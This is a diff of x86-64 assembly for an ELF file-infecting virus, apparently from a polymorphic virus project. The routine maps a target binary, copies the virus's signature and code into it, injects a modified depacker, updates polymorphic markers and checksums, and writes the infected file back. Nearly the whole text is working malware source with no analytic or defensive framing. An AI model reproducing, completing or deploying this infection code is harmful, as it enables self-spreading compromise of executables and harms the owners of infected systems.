@@ -4,7 +4,7 @@
 section .text
 	global _update_mmaped_file
 
-_update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_size, long virus_size, long fd, long code_inc)
+_update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_size, long virus_size, long fd)
 	enter 400, 0
 	; rsp + 0  mmap start address (ehdr)
 	; rsp + 8  file size
@@ -27,7 +27,7 @@ _update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_siz
 	; rsp + 140 PT_LOAD segment offset in file
 	; rsp + 148 text section vaddr
 	; rsp + 240 -> 368, table_offset_tmp.
-	; rsp + 376 code_inc
+	; rsp + 376 -> mmap string code addr
 	;;;;;;;;;;;;;;;;;;;;;
 
 ; init phase
@@ -39,9 +39,6 @@ _update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_siz
 	mov QWORD [rsp + 16], rdx
 
 	mov QWORD [rsp + 24], r10
-
-	mov QWORD [rsp + 376], r11
-
 	mov QWORD [rsp + 124], 0
 
 ; init phdr (ehdr + ehdr->e_phoff)
@@ -334,47 +331,21 @@ _write_in_tmp_map:
 _copy_start_point:
 	mov rdi, QWORD [rsp + 108]
 	add rdi, QWORD [rsp + 116]
-	lea rsi, [rel _string.signature]
-	lea rcx, [rel _string.code]
-;	sub rcx, 8
-	sub rcx, rsi
-	add QWORD [rsp + 116], rcx ; add 8 to our index
-	cld
-	rep movsb
-
-	; rsp + 376 code_inc
-	mov rdi, QWORD [rsp + 108]
-	add rdi, QWORD [rsp + 116]
-	lea rsi, [rel _string.code]
-	mov rcx, 8
-	add QWORD [rsp + 116], rcx ; add 8 to our index
-	cld
-	rep movsb
-
-	mov rdi, QWORD [rsp + 108]
-	add rdi, QWORD [rsp + 116]
-	sub rdi, 8
-	xor rsi, rsi
-	mov si, WORD [rsp + 378]
-	call _update_polymorph_number
-
-	mov rdi, QWORD [rsp + 108]
-	add rdi, QWORD [rsp + 116]
-	sub rdi, 4
-	xor rsi, rsi
-	mov si, WORD [rsp + 376]
-	call _update_polymorph_number
-
-	mov rdi, QWORD [rsp + 108]
-	add rdi, QWORD [rsp + 116]
-	lea rsi, [rel _start]
-	sub rsi, 1
+	lea rsi, [rel _string]
+	lea r10, [rel _string.code]
+	sub r10, rsi
+	mov QWORD [rsp + 376], rdi
+	add QWORD [rsp + 376], r10
 	lea rcx, [rel _checkproc]
 	sub rcx, 8
 	sub rcx, rsi
 	add QWORD [rsp + 116], rcx ; add 8 to our index
 	cld
 	rep movsb
+
+_replace_code_by_0:
+	mov rdi, QWORD [rsp + 376]
+	mov QWORD [rdi], '00000000'
 
 ;; Here is the part that is unencrypted and will be switched.
 ;; We have 2 tables in our binary: _functions_offset_from_start, _table_offset
@@ -641,17 +612,10 @@ _inject_modified_depacker:
 
 _calcul_checksum:
 	mov rdi, QWORD [rsp + 108]
-	add rdi, QWORD [rsp + 72]
-	lea rsi, [rel _checksum]
-	lea r10, [rel _o_entry]
-	sub rsi, r10
-	mov r12, 0x0303030303030303
-	call _jump_to_function
-;	call _crc32
-	mov rdi, QWORD [rsp + 108]
 	add rdi, QWORD [rsp + 116]
-	mov DWORD [rdi], eax
+	mov DWORD [rdi], 0x00000000
 	add QWORD [rsp + 116], 4
+;	call _crc32
 
 _align_to_page_size:
 ; for i < PAGE_SIZE - (virus_size + 8 + key_size(256) + decrypt_size) memset(mmap_tmp, 0, 1);
@@ -682,8 +646,35 @@ _last_write:
 	add rsi, QWORD [rsp + 72]
 	mov rcx, QWORD [rsp + 8] ; size
 	sub rcx, QWORD [rsp + 72]
+	add QWORD [rsp + 116], rcx
 	cld
 	rep movsb
+
+_update_signature_checksum:
+	mov rdi, QWORD [rsp + 108]
+	mov rsi, QWORD [rsp + 8]
+	add rsi, PAGE_SIZE
+	mov r12, 0x0303030303030303
+	call _jump_to_function
+	mov rdi, QWORD [rsp + 376]
+	mov rsi, rax
+	call _update_polymorph_number
+
+_update_virus_checksum:
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 72]
+	lea rsi, [rel _checksum]
+	lea r10, [rel _o_entry]
+	sub rsi, r10
+	mov r12, 0x0303030303030303
+	call _jump_to_function
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 72]
+	lea rsi, [rel _checksum]
+	lea r10, [rel _o_entry]
+	sub rsi, r10
+	add rdi, rsi
+	mov DWORD [rdi], eax
 
 _write_into_file:
 ;; write(fd, mmap_tmp, file_size + PAGE_SIZE)
